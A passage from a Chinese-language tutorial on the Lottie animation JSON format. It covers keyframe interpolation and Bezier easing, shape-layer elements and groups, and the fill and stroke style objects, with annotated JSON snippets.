<pre><code class="hljs language-json" lang="json"><span class="hljs-attr">"r"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"a"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span>            <span class="hljs-comment">// 动画值标识（a=1 表示有关键帧动画）</span>
  <span class="hljs-attr">"k"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>             <span class="hljs-comment">// 关键帧数组</span>
    <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"i"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-attr">"x"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">0.667</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"y"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">1</span><span class="hljs-punctuation">]</span> <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>   <span class="hljs-comment">// 入缓动</span>
      <span class="hljs-attr">"o"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-attr">"x"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">0.333</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"y"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">0</span><span class="hljs-punctuation">]</span> <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>   <span class="hljs-comment">// 出缓动</span>
      <span class="hljs-attr">"t"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span>                            <span class="hljs-comment">// 时间点：第0帧</span>
      <span class="hljs-attr">"s"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">0</span><span class="hljs-punctuation">]</span>                           <span class="hljs-comment">// 起始值：0度</span>
    <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"t"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">90</span><span class="hljs-punctuation">,</span>                           <span class="hljs-comment">// 时间点：第90帧</span>
      <span class="hljs-attr">"s"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">360</span><span class="hljs-punctuation">]</span>                         <span class="hljs-comment">// 结束值：360度</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p><strong>核心差异总结：</strong></p>






























<table><thead><tr><th>特征</th><th>静态值 (<code>a: 0</code>)</th><th>动画值 (<code>a: 1</code>)</th></tr></thead><tbody><tr><td><code>k</code> 的类型</td><td>单个数值或数组</td><td>关键帧对象数组</td></tr><tr><td>时间轴</td><td>无时间概念，始终保持固定值</td><td>在时间轴上定义多个状态点</td></tr><tr><td>缓动控制</td><td>无</td><td>通过 <code>i</code> 和 <code>o</code> 控制运动节奏</td></tr><tr><td>适用场景</td><td>静态属性（如固定位置、固定角度）</td><td>需要随时间变化的属性（移动、旋转、缩放等）</td></tr></tbody></table>
<h3 data-id="heading-15"><strong>关键帧数组结构解析</strong></h3>
<p>当属性设置为动画值（<code>a: 1</code>）时，<code>k</code> 字段不再是一个简单值，而是一个<strong>关键帧对象数组</strong>。每个关键帧对象定义了动画在特定时间点的状态。</p>
<h4 data-id="heading-16"><strong>核心字段说明</strong></h4>















































<table><thead><tr><th>字段</th><th>类型</th><th>必选</th><th>描述</th></tr></thead><tbody><tr><td><strong><code>t</code></strong></td><td><code>number</code></td><td>是</td><td><strong>时间点（Time）</strong>：该关键帧在时间轴上的位置，单位为帧。</td></tr><tr><td><strong><code>s</code></strong></td><td><code>array</code></td><td>是</td><td><strong>起始值（Start Value）</strong>：该关键帧的属性值。对于旋转是 <code>[角度]</code>，位置是 <code>[x, y, z]</code>。</td></tr><tr><td><strong><code>e</code></strong></td><td><code>array</code></td><td>否</td><td><strong>结束值（End Value）</strong>：从当前关键帧到下一关键帧的目标值。<strong>通常省略</strong>，渲染器会自动使用下一关键帧的 <code>s</code> 值。</td></tr><tr><td><strong><code>i</code></strong></td><td><code>object</code></td><td>否</td><td><strong>入缓动（In Tangent）</strong>：定义<strong>进入</strong>当前关键帧时的速度变化曲线（贝塞尔控制点）。</td></tr><tr><td><strong><code>o</code></strong></td><td><code>object</code></td><td>否</td><td><strong>出缓动（Out Tangent）</strong>：定义<strong>离开</strong>当前关键帧时的速度变化曲线（贝塞尔控制点）。</td></tr><tr><td><strong><code>h</code></strong></td><td><code>number</code></td><td>否</td><td><strong>保持帧（Hold）</strong>：值为 <code>1</code> 时，表示该关键帧到下一关键帧之间<strong>不插值</strong>，保持当前值（阶跃动画）。</td></tr></tbody></table>
<blockquote>
<p><strong>说明</strong>：</p>
<ol>
<li><strong><code>s</code> 的数据类型</strong>：虽然官方 schema 中定义为 <code>number</code>，但在实际使用中，<code>s</code> 通常是<strong>数组</strong>（如 <code>[0]</code> 表示旋转 0 度，<code>[100, 200, 0]</code> 表示位置）。这是为了统一处理单维和多维属性。</li>
<li><strong><code>e</code> 字段的实际使用</strong>：在大多数情况下，<code>e</code> 字段会被省略，渲染器会自动从下一个关键帧的 <code>s</code> 值推断目标值。只有在需要显式控制插值目标时才会使用。</li>
<li><strong>最后一帧</strong>：最后一个关键帧通常只有 <code>t</code> 和 <code>s</code>，不需要 <code>i</code>、<code>o</code>、<code>e</code>（因为没有下一个关键帧）。</li>
</ol>
</blockquote>
<h4 data-id="heading-17"><strong>缓动控制点的结构</strong></h4>
<p><code>i</code> 和 <code>o</code> 对象定义了贝塞尔曲线的控制点，用于控制动画的加速度：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"i"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"x"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">0.667</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>  <span class="hljs-comment">// 入缓动的 X 轴控制点（时间维度，范围 0-1）</span>
    <span class="hljs-attr">"y"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">1</span><span class="hljs-punctuation">]</span>       <span class="hljs-comment">// 入缓动的 Y 轴控制点（数值维度，通常 0-1，但可超出）</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"o"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"x"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">0.333</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>  <span class="hljs-comment">// 出缓动的 X 轴控制点</span>
    <span class="hljs-attr">"y"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">0</span><span class="hljs-punctuation">]</span>       <span class="hljs-comment">// 出缓动的 Y 轴控制点</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<ul>
<li><strong><code>x</code> 数组</strong>：控制<strong>时间进度</strong>的变化率（水平方向）</li>
<li><strong><code>y</code> 数组</strong>：控制<strong>数值变化</strong>的速率（垂直方向）</li>
<li><strong>数组长度</strong>：对于单维属性（如旋转 <code>r</code>），数组长度为 1；对于多维属性（如位置 <code>p</code>），数组长度对应维度数（如 <code>[0.5, 0.3]</code> 表示 X、Y 两个维度的独立控制）</li>
</ul>
<blockquote>
<p><strong>前端知识关联</strong>：<code>i</code> 与 <code>o</code> 定义的贝塞尔曲线，其作用与 CSS 中的 <code>transition-timing-function</code> 或 <code>animation-timing-function</code> 完全一致，用于创造非匀速的动画效果。区别在于，CSS 使用一个二维的 <code>cubic-bezier(x1, y1, x2, y2)</code>，而 Lottie 的 <code>i</code> 和 <code>o</code> 允许为每个属性维度单独定义控制点，控制更为精细。</p>
<p><strong>工具推荐</strong>：如果您需要直观地创建或理解贝塞尔曲线，强烈推荐使用在线工具 <strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fcubic-bezier.com%2F" target="_blank" title="https://cubic-bezier.com/" ref="nofollow noopener noreferrer">cubic-bezier.com</a></strong>。您可以在那里调整曲线并获取对应的 <code>cubic-bezier()</code> 值，其原理与 Lottie 的 <code>i</code>/<code>o</code> 控制点相通，是理解和调试动画缓动的绝佳助手。</p>
</blockquote>
<h3 data-id="heading-18"><strong>关键帧的工作流程</strong></h3>
<p>以 demo 中的旋转动画为例，让我们逐步拆解渲染器如何处理关键帧：</p>
<h4 data-id="heading-19"><strong>第 1 步：解析关键帧数组</strong></h4>
<pre><code class="hljs language-json" lang="json"><span class="hljs-attr">"k"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
  <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"t"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span>        <span class="hljs-comment">// 第0帧</span>
    <span class="hljs-attr">"s"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">0</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>      <span class="hljs-comment">// 旋转角度 0°</span>
    <span class="hljs-attr">"i"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-attr">"x"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">0.667</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"y"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">1</span><span class="hljs-punctuation">]</span> <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"o"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-attr">"x"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">0.333</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"y"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">0</span><span class="hljs-punctuation">]</span> <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"t"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">90</span><span class="hljs-punctuation">,</span>       <span class="hljs-comment">// 第90帧</span>
    <span class="hljs-attr">"s"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">360</span><span class="hljs-punctuation">]</span>     <span class="hljs-comment">// 旋转角度 360°</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">]</span>
</code></pre>
<p>渲染器识别出：</p>
<ul>
<li>动画从第 0 帧开始，到第 90 帧结束</li>
<li>起始角度 0°，结束角度 360°</li>
<li>需要在这 90 帧之间进行插值计算</li>
</ul>
<h4 data-id="heading-20"><strong>第 2 步：插值计算（以第 45 帧为例）</strong></h4>
<p>当播放到第 45 帧时，渲染器需要计算此时的旋转角度：</p>
<ol>
<li><strong>计算时间进度</strong>：<code>progress = (45 - 0) / (90 - 0) = 0.5</code>（已完成 50%）</li>
<li><strong>应用缓动函数</strong>：根据 <code>i</code> 和 <code>o</code> 的贝塞尔控制点，将线性进度 <code>0.5</code> 转换为缓动后的进度（假设为 <code>0.55</code>）</li>
<li><strong>计算属性值</strong>：<code>angle = 0 + (360 - 0) × 0.55 = 198°</code></li>
</ol>
<h4 data-id="heading-21"><strong>第 3 步：渲染当前帧</strong></h4>
<p>渲染器将计算出的 198° 应用到图层的旋转属性，完成该帧的绘制。</p>
<h4 data-id="heading-22"><strong>关键帧的连续性</strong></h4>
<p>在多个关键帧的场景中，渲染器会：</p>
<ul>
<li><strong>定位当前区间</strong>：找到当前时间点所在的关键帧区间（如第 30 帧位于第 0 帧和第 90 帧之间）</li>
<li><strong>使用对应缓动</strong>：应用该区间起始关键帧的 <code>o</code>（出缓动）和结束关键帧的 <code>i</code>（入缓动）</li>
<li><strong>独立插值</strong>：对于多维属性（如位置 <code>[x, y, z]</code>），每个维度独立进行插值计算</li>
</ul>
<h3 data-id="heading-23"><strong>本章小结</strong></h3>
<p>至此，我们已经掌握了 Lottie 动画系统的“动力源”：<strong>关键帧、插值与缓动</strong>。</p>
<ul>
<li><strong>静态与动画的开关</strong>：通过 <code>a</code> 字段 (<code>0</code> 或 <code>1</code>) 切换属性的静态与动态模式，是理解 Lottie 动画逻辑的第一课。</li>
<li><strong>关键帧定义状态</strong>：<code>k</code> 数组中的每个关键帧对象，通过 <code>t</code> (时间) 和 <code>s</code> (数值) 在时间轴上锚定了动画的各个“关键时刻”。</li>
<li><strong>缓动赋予灵魂</strong>：<code>i</code> (入缓动) 与 <code>o</code> (出缓动) 所定义的贝塞尔曲线，控制了数值变化的速率与节奏，是让动画摆脱机械感、获得生命力的关键。</li>
<li><strong>渲染器执行插值</strong>：在关键帧之间，Lottie 渲染器会依据缓动曲线，为每一帧<strong>实时计算</strong>出精确的属性值，从而创造出平滑的动画效果。</li>
</ul>
<p>您已经了解了从定义到渲染的完整链条。关于<strong>贝塞尔曲线的数学原理</strong>、<strong>多维属性的独立插值策略</strong>以及更复杂的<strong>表达式动画</strong>，都属于更深入的话题。掌握了本章的核心数据模型，您已经具备了自行解析绝大多数 Lottie 动画、并理解其运动逻辑的能力。</p>
<hr/>
<h2 data-id="heading-24"><strong>五、形状系统 - 矢量图形</strong></h2>
<p>在 Lottie 的六种基础图层中，<strong>形状图层（Shape Layer，<code>ty: 4</code>）</strong>  占据着独特而核心的地位。其他图层类型——如空对象图层（用于控制）、预合成图层（用于嵌套）、图像图层（静态位图）和文本图层（字形动画）——虽然在特定场景下不可或缺，但它们在数据结构和动画能力上相对简单。</p>
<p>形状图层（<code>ty: 4</code>）是 Lottie 实现复杂矢量动画的核心。与其他图层类型相比，它拥有最丰富的专有属性和最强的动画表现力。</p>
<h3 data-id="heading-25"><strong>形状图层的结构：<code>ty: 4</code> 与 <code>shapes</code> 数组</strong></h3>
<p>当一个图层的 <code>ty</code> 值为 <code>4</code> 时，它就是一个形状图层。其核心数据容器是 <strong><code>shapes</code></strong> 数组（在早期的 Lottie 版本中可能标记为 <code>it</code>）。该数组是一个<strong>有序的列表</strong>，定义了构成最终矢量图形的所有基础元素，例如路径、描边、填充等。</p>
<ul>
<li><strong>有序渲染与叠加</strong>：<code>shapes</code> 数组中的元素严格遵循<strong>数组索引顺序（从 <code>0</code> 到 <code>n-1</code>）进行渲染</strong>。在视觉上，这意味着<strong>索引值更大的元素（后渲染）会叠加在索引值更小的元素（先渲染）之上</strong>。例如，<code>shapes[2]</code> 会覆盖在 <code>shapes[0]</code> 和 <code>shapes[1]</code> 之上。这一规则是组织复杂图形层级的基础。</li>
<li><strong>元素类型</strong>：每个元素都是一个独立的对象，并通过 <code>ty</code> 字段来声明自己的类型（如 <code>gr</code> 表示组，<code>sh</code> 表示路径等）。</li>
</ul>
<h3 data-id="heading-26"><strong>四种基础形状类型速览</strong></h3>
<p><code>shapes</code> 数组中可以包含多种图形元素，其中基础形状主要有以下四种：</p>



































<table><thead><tr><th>类型标识 (<code>ty</code>)</th><th>名称</th><th>描述</th><th>核心动画属性</th></tr></thead><tbody><tr><td><strong><code>rc</code></strong></td><td><strong>矩形</strong></td><td>定义矩形或圆角矩形。</td><td><code>p</code> (位置), <code>s</code> (尺寸), <code>r</code> (圆角半径)</td></tr><tr><td><strong><code>el</code></strong></td><td><strong>椭圆</strong></td><td>定义圆形或椭圆形。</td><td><code>p</code> (中心点), <code>s</code> (半径/尺寸)</td></tr><tr><td><strong><code>sr</code></strong></td><td><strong>星形/多边形</strong></td><td>定义星形或多边形，可控制角数、内外径等。</td><td><code>p</code> (中心点), <code>ir</code>/<code>or</code> (内/外半径), <code>pt</code> (角数)</td></tr><tr><td><strong><code>sh</code></strong></td><td><strong>自由路径</strong></td><td>由贝塞尔曲线构成的任意形状路径，是矢量图形的基础。</td><td><code>ks</code> (路径数据，包含顶点与贝塞尔控制点)</td></tr></tbody></table>
<blockquote>
<p><strong>说明</strong>：<code>rc</code>, <code>el</code>, <code>sr</code> 本质上是参数化形状，它们会在导出时被转换为最终的 <code>sh</code>（路径）数据。但在 JSON 中，它们作为逻辑元素存在，便于理解和编辑。</p>
</blockquote>
<h3 data-id="heading-27"><strong>自由路径的核心：顶点与贝塞尔控制点</strong></h3>
<p>自由路径（<code>ty: ‘sh‘</code>）是最基础、最灵活的形状元素。其核心数据存储在 <code>ks</code> 属性中，它定义了一系列<strong>顶点（Vertex）</strong>  以及连接这些顶点的<strong>贝塞尔曲线</strong>。</p>
<p>一个路径的关键帧数据通常包含以下字段：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  “a”<span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 表示路径数据是动画的</span>
  “k”<span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    “i”<span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">[</span><span class="hljs-number">0</span><span class="hljs-punctuation">,</span> <span class="hljs-number">0</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 入控制点 (In Tangent)</span>
    “o”<span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">[</span><span class="hljs-number">0</span><span class="hljs-punctuation">,</span> <span class="hljs-number">0</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 出控制点 (Out Tangent)</span>
    “v”<span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">[</span><span class="hljs-number">50</span><span class="hljs-punctuation">,</span> <span class="hljs-number">50</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 顶点 (Vertex)</span>
    “c”<span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span> <span class="hljs-comment">// 路径是否闭合 (Closed)</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<ul>
<li><strong><code>v</code> (顶点)</strong> ：一个二维数组，定义了路径在空间中经过的关键点坐标 <code>[x, y]</code>。</li>
<li><strong><code>i</code> (入控制点)</strong> ：定义曲线<strong>进入</strong>当前顶点时的方向与张力。</li>
<li><strong><code>o</code> (出控制点)</strong> ：定义曲线<strong>离开</strong>当前顶点时的方向与张力。</li>
<li><strong><code>c</code> (闭合)</strong> ：布尔值，<code>true</code> 表示路径的首尾顶点应连接，形成封闭图形。</li>
</ul>
<p><strong>工作原理</strong>：<code>v</code> 定义了“骨架”，<code>i</code> 和 <code>o</code> 则定义了连接骨架的“肌肉”曲线。通过为这些数据添加关键帧，即可实现路径的形变、绘制等复杂动画。</p>
<blockquote>
<p><strong>知识关联：两种贝塞尔曲线</strong><br/>
您可能已经发现，这里的 <code>i</code> 和 <code>o</code> 与第四章<strong>关键帧缓动</strong>中的 <code>i</code> 和 <code>o</code> 字段同名，且都代表贝塞尔曲线的控制点。这是 Lottie 中贝塞尔曲线的两种核心应用：</p>






























<table><thead><tr><th>维度</th><th><strong>空间贝塞尔曲线 (本章)</strong></th><th><strong>时间贝塞尔曲线 (第四章)</strong></th></tr></thead><tbody><tr><td><strong>作用</strong></td><td>定义<strong>空间中</strong>的图形<strong>形状</strong>。</td><td>定义<strong>时间上</strong>的属性<strong>变化速率</strong>（缓动）。</td></tr><tr><td><strong>控制点 (<code>i</code>/<code>o</code>)</strong></td><td>控制顶点处曲线的<strong>方向与曲率</strong>，决定路径形态。</td><td>控制关键帧处动画<strong>速度的快慢</strong>，决定运动节奏。</td></tr><tr><td><strong>坐标空间</strong></td><td>位于画布的<strong>二维/三维空间</strong> (如 <code>[x, y]</code>)。</td><td>位于<strong>时间-进度二维空间</strong>，X轴是时间(0-1)，Y轴是进度(0-1)。</td></tr><tr><td><strong>直观感受</strong></td><td>拖拽控制柄，改变的是<strong>线的弯曲程度</strong>。</td><td>拖拽控制柄，改变的是<strong>动画的先快后慢</strong>。</td></tr></tbody></table>
<p><strong>底层一致性</strong>：尽管应用不同，但两者都基于<strong>三次贝塞尔曲线</strong>的数学模型。理解这一点后，无论是调整路径平滑度还是动画缓动，您操作的都是同一种“控制点”逻辑。这也解释了为何可视化工具 <strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fcubic-bezier.com%2F" target="_blank" title="https://cubic-bezier.com/" ref="nofollow noopener noreferrer">cubic-bezier.com</a></strong> 对理解两者都有帮助：虽然它主要用于缓动（时间），但其对曲线形态的直观展示，同样有助于您想象空间路径中控制点对形状的影响。</p>
</blockquote>
<h3 data-id="heading-28"><strong>形状组（<code>gr</code>）：嵌套与组织</strong></h3>
<p>为了管理复杂的图形，Lottie 引入了 <strong>形状组（<code>ty: ‘gr‘</code>）</strong> 。组可以将多个形状元素（包括其他组）打包为一个逻辑整体。</p>
<ul>
<li>
<p><strong><code>it</code> 数组</strong>：组的核心属性，是一个数组，用于包含其子元素（如路径、填充、描边或其他组）。</p>
</li>
<li>
<p><strong>作用</strong>：</p>
<ol>
<li><strong>层次化管理</strong>：像文件夹一样组织图形，使结构清晰。</li>
<li><strong>统一变换</strong>：组可以拥有自己的 <code>ks</code>（变换）属性。对该组应用的变换（如移动、缩放）会同时影响其内部所有子元素。</li>
<li><strong>动画复用</strong>：通过控制组的变换，可以轻松实现整个图形模块的动画。</li>
</ol>
</li>
</ul>
<hr/>
<h2 data-id="heading-29"><strong>六、形状样式 - 填充与描边</strong></h2>
<p>在上一章中，我们探索了形状图层如何通过路径、椭圆、矩形等元素定义图形的<strong>几何骨架</strong>。然而，只有几何形状是“不可见”的。要让图形真正被渲染出来，就需要为其赋予<strong>样式</strong>。</p>
<p>本章将介绍形状系统中负责视觉呈现的两大核心样式元素：<strong>填充（Fill）</strong>  与<strong>描边（Stroke）</strong> 。它们为形状的<strong>内部</strong>和<strong>轮廓</strong>提供颜色、渐变和不透明度等视觉效果，是矢量图形从“线框”变为“画面”的关键。</p>
<h3 data-id="heading-30"><strong>6.1 样式的作用：让形状可见</strong></h3>
<p>在 <code>shapes</code> 数组中，样式元素（如 <code>fl</code>、<code>st</code>）与形状元素（如 <code>sh</code>、<code>el</code>）地位平等，通过<strong>渲染顺序</strong>相互结合。</p>
<ul>
<li><strong>堆叠规则</strong>：<code>it</code> 数组中的元素<strong>按索引顺序依次绘制</strong>。这意味着索引更大的元素（后绘制的）会叠加在索引更小的元素（先绘制的）之上。在图形构建中，通常先定义"形状"元素（如 <code>el</code>, <code>sh</code>），再定义为其着色的"样式"元素（如 <code>fl</code>, <code>st</code>）。</li>
<li><strong>独立性与组合性</strong>：样式元素是独立的，可以自由组合。一个形状可以同时拥有填充和描边，也可以只有其中一种。它们共同附着于其上方最近且未闭合的图形元素或组。</li>
</ul>
<h3 data-id="heading-31"><strong>填充（Fill）：纯色与渐变</strong></h3>
<p>填充用于为形状的内部区域着色。Lottie 支持两种填充类型。</p>
<h4 data-id="heading-32"><strong>纯色填充（<code>ty</code>: 'fl'）</strong></h4>
<p>这是最基础的填充类型，使用单一颜色。</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"ty"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"fl"</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 类型：Fill (纯色填充)</span>
  <span class="hljs-attr">"c"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>      <span class="hljs-comment">// Color (颜色)</span>
    <span class="hljs-attr">"a"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"k"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">0.2</span><span class="hljs-punctuation">,</span> <span class="hljs-number">0.6</span><span class="hljs-punctuation">,</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span> <span class="hljs-number">1</span><span class="hljs-punctuation">]</span> <span class="hljs-comment">// RGBA 数组，值范围 0-1</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"o"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> ... <span class="hljs-punctuation">}</span> <span class="hljs-comment">// Opacity (不透明度)</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h4 data-id="heading-33"><strong>渐变填充（<code>ty</code>: 'gf'）</strong></h4>
<p>Lottie 支持线性渐变和径向渐变，为填充带来丰富的色彩过渡。</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"ty"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"gf"</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 类型：Gradient Fill (渐变填充)</span>
  <span class="hljs-attr">"t"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span>     <span class="hljs-comment">// 渐变类型：1-线性，2-径向</span>
  <span class="hljs-attr">"g"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"p"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">2</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"k"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"a"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"k"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">0</span><span class="hljs-punctuation">,</span> <span class="hljs-number">0.2</span><span class="hljs-punctuation">,</span> <span class="hljs-number">0.6</span><span class="hljs-punctuation">,</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span> <span class="hljs-number">1</span><span class="hljs-punctuation">]</span>
      <span class="hljs-punctuation">}</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-attr">"s"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> ... <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 起点 (线性) / 起始点 (径向)</span>
  <span class="hljs-attr">"e"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> ... <span class="hljs-punctuation">}</span>  <span class="hljs-comment">// 终点 (线性) / 结束点 (径向)</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<ul>
<li><strong><code>g</code> 对象</strong>：是渐变的核心。<code>p</code> 定义色标数量，<code>k</code> 是一个扁平的数组，每 5 个数字为一组，表示一个色标的 <code>[位置, R, G, B, A]</code>。所有色标数据按顺序连接。</li>
</ul>
<h3 data-id="heading-34"><strong>描边（Stroke）：轮廓与样式</strong></h3>
<p>描边用于绘制形状的轮廓线。它拥有比填充更丰富的属性来控制线条的视觉表现。</p>
<h4 data-id="heading-35"><strong>纯色描边（<code>ty</code>: 'st'）</strong></h4>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"ty"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"st"</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 类型：Stroke (描边)</span>
  <span class="hljs-attr">"c"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> ... <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 颜色，同填充</span>
  <span class="hljs-attr">"w"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>      <span class="hljs-comment">// Width (线宽)</span>
    <span class="hljs-attr">"a"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"k"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">5</span>    <span class="hljs-comment">// 线宽为5像素</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"lc"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">2</span><span class="hljs-punctuation">,</span>    <span class="hljs-comment">// Line Cap (线帽): 1-平头, 2-圆头, 3-方头</span>
  <span class="hljs-attr">"lj"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">2</span><span class="hljs-punctuation">,</span>    <span class="hljs-comment">// Line Join (连接): 1-斜接, 2-圆角, 3-斜面</span>
  <span class="hljs-attr">"ml"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">10</span><span class="hljs-punctuation">,</span>   <span class="hljs-comment">// Miter Limit (斜接限制)</span>
  <span class="hljs-attr">"o"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> ... <span class="hljs-punctuation">}</span> <span class="hljs-comment">// 不透明度</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<ul>
